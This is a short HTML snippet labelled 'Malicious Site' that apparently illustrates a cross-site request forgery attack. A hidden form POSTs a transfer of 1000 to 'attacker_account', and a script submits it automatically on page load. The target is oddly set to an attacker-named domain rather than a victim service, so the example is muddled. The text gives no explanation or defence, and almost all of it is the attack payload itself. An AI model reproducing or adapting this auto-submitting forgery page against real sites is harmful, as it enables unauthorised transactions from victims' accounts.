<!-- Malicious Site -->
<form action="https://hackerswebsite.com/transfer" method="POST">
    <input type="hidden" name="amount" value="1000">
    <input type="hidden" name="to_account" value="attacker_account">
    <input type="submit" value="Submit">
</form>

<script>
    // Automatically submit the form when the page loads
    document.forms[0].submit();
</script>
